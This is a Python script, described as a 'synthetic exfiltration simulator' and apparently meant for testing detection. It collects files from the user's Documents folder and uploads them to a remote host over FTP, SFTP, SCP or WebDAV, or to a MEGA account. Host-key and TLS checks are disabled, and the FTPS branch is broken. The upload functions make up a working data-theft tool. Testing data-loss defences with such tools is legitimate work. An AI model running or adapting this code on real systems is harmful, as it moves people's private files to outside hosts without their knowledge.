# synthetic exfiltration simulator
# This script will copy to the host specified using the protocol provided
# copy form %USERPROFILE%/Docuemnts
# example: python .\syntheticExfil.py ftp  --host ubuntuTarget -l username -p password  -v 
# example: python .\syntheticExfil.py ftp  --host ubuntuTarget -l username -p password  -v --include include.txt
# example: python .\syntheticExfil.py sftp  --host ubuntuTarget -l username -p password  -v 
# example: python .\syntheticExfil.py scp  --host ubuntuTarget -l username -p password  -v 
# example: python .\syntheticExfil.py webdav  --host ubuntuTarget -l username -p password  -v 

import argparse
import logging
import os
from ftplib import FTP
from ftplib import FTP_TLS
import pysftp
from webdav3.client import Client
from paramiko import SSHClient
from scp import SCPClient
from mega import Mega
import paramiko

def ftpExfiltration(host, user, passwd, fileList):
    with FTP(host) as ftp:
        
        ftp.login(user=user, passwd=passwd)
        logging.debug('FTP logon, user: %s', user)
  
        for filename in fileList: 
            ftp.storbinary('STOR ' + filename, open(filename, 'rb'))
        
        # ftp.dir()
        ftp.quit()

    return

def ftpsExfiltration(host, user, passwd, filelist):
    with FTP_TLS(host) as ftps:
       
        ftps.login(user=user, passwd=passwd)
        logging.debug('FTPS logon, user: %s', user)

        # temporary
        ftps.debugging = 2

        ftps.prot_p()
        logging.debug('FTPS Data protection level set to private')

        # ftps.set_pasv(True)

        # for filename in fileList: 
        #     print(f'{filename=}')
        #     ftps.storbinary('STOR ' + filename, open(filename, 'rb'))
        ftps.cwd('c:/CPH_Python')
        ftps.pwd()
        # ftps.sendcmd('TYPE I')
        # ftps.sendcmd('EPSV')
        # ftps.sendcmd('PASV')
        # ftps.sendcmd('STOR ftps.txt')
        # f = open('ftps.txt', 'rb')
        ftps.storbinary('STOR ftps.txt', open('ftps.txt', 'rb'))
       
        open()
        # f.close()
        ftps.sendcmd('EPSV')
        ftps.quit()

    return

def sftpExfiltration(host, user, passwd, fileList):
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None

    with pysftp.Connection(host,username=user,password=passwd,cnopts=cnopts) as sftp:
       
        logging.debug('SFTP connection, host %s, user: %s', host, user)
       
        sftp.chdir('./sftp')
        for filename in fileList: 
            sftp.put(filename)

    return

def webdavExfiltration(host, user, passwd, source, fileList):

    webdavHostName = 'http://' + host + '/webdav'

    options = {
        'webdav_hostname': webdavHostName,
        'webdav_login': user,
        'webdav_password': passwd
    }       
    client = Client(options)
    client.verify = False
    
    logging.debug('WebDAV connection, host %s, user: %s', webdavHostName, user)
       
    for filename in fileList: 
        client.upload_sync(remote_path=filename, local_path=source+'\\'+filename)

    logging.debug('WebDAV host file list (first 10 files): %s', client.list()[0:10])

    return

def scpExfiltration(host, user, passwd, source, fileList):

    with SSHClient() as ssh:
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        ssh.connect(host,username=user,password=passwd)

        with SCPClient(ssh.get_transport()) as scp:
    
            logging.debug('SCP connection, host %s, user: %s', host, user)
       
            for filename in fileList: 
                scp.put(source+'\\'+filename, remote_path='./scp')
        
            # logging.debug('SCP host file list (first 10 files): %s', ssh.exec_command('ls'))

    return

def megaExfiltration(user, passwd, fileList):

    mega = Mega()

    try:
        m = mega.login(user,passwd)
        logging.debug('MEGA login as user: %s', user)
    except:
        logging.debug('MEGA login didnt work, user %s', user)

    for fileName in fileList:
        try: 
            m.upload(fileName)
            print(f'{fileName=}')
        except:
            logging.debug('Unable to upload file %s to MEGA', fileName)

    return

def buildFileList(include):

    fileList = []

    # if a list of file types to incldue has been specified then
    # use them otherwise select all files
    if include == ():
        for file in os.listdir():
            if os.path.isfile(file):
                fileList.append(file)
    else:
        for file in os.listdir():
            if file.endswith(include):
                fileList.append(file)

    logging.debug('Exfiltration file count: %s', len(fileList))
    logging.debug('Exfiltration file list (first 10): %s', fileList[:10])
    
    return fileList

def buildIncludeTuple(includeFile):

    includeList = []

    with open(includeFile, 'r') as file:
        lines=file.readlines()
        for line in lines:
            includeList.append(line.strip())

    file.close()

    logging.debug('File extensions on include list: %s',tuple(includeList))

    return tuple(includeList)

def dataExfiltration(protocol, host, user, passwd, source, include):
        
    # include, if specified, should be the name of a file containing include file types
    if include == "":
        includeTuple = ()
    else:
        includeTuple = buildIncludeTuple(include)
        
    startDirectory = os.getcwd()

    # set as appropriate
    source = os.environ['USERPROFILE']+'\\Documents'
    os.chdir(source)

    fileList=buildFileList(includeTuple)

    match protocol:
        case 'ftp':
            ftpExfiltration(host, user, passwd, fileList)
        case 'ftps':
            ftpsExfiltration(host, user, passwd, fileList)
        case 'sftp':
            sftpExfiltration(host, user, passwd, fileList)
        case 'webdav':
            webdavExfiltration(host, user, passwd, source, fileList)
        case 'scp':
            scpExfiltration(host, user, passwd, source, fileList)
        case 'mega':
            megaExfiltration(user, passwd, fileList)
        case _:
            print(protocol,' not implemented')
            # raise NotImplementedError('Not implemented')

    os.chdir(startDirectory)

    return

if __name__ == '__main__':
    # define comamnd line arguemnts
    parser = argparse.ArgumentParser(description="Synthetic data exfiltration tool")
    parser.add_argument('protocol',
                        help='Specifies the protocol to be used, ftp, ftps, sftp, WebDAV, scp or mega',
                        type=str,
                        choices=['ftp','ftps','sftp','webdav','scp','mega'])
    parser.add_argument('--host',
                        help='Specifies the host name or IP address of the host, required if protocol is ftp/ftps/sftp/webdav/scp',
                        type=str
                        )
    parser.add_argument('--user',
                        '-l', 
                        help='Optional, specifies the login name or email. Anonymous will be used if not specifieed',
                        type=str
                        )
    parser.add_argument('--passwd',
                        '-p', 
                        help='Optional, specifies the password',
                        type=str
                        )
    parser.add_argument('--include',
                        '-i', 
                        help='Optional, specifies the file holding the include filename extensions (e.g. .xlsx, .docx)',
                        type=str
                        )
    parser.add_argument('--verbose',
                        '-v', 
                        help='Optional flag, if set logging messages will be produced',
                        action='store_true'
                        )

    args = parser.parse_args()

    if args.verbose == True:
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        logging.debug('Start of program')
    else:
        logging.disable(logging.DEBUG)

    if args.host == None:
        if args.protocol != 'mega':
            logging.debug('Target host must be specified for protocol %s using parameter --host ', args.protocol)
            exit()
    
    if args.user == None:
        args.user = 'Anonymous'
        logging.debug('User not specified, Anonymous will be used')

    if args.include == None:
        args.include = ""
        logging.debug('No file type filter file specified')

    # source simply defaults to %USERPROFILE%\Documents at the moment
    source =''

    dataExfiltration(args.protocol, args.host, args.user,args.passwd, source, args.include)

    logging.debug('End of program')
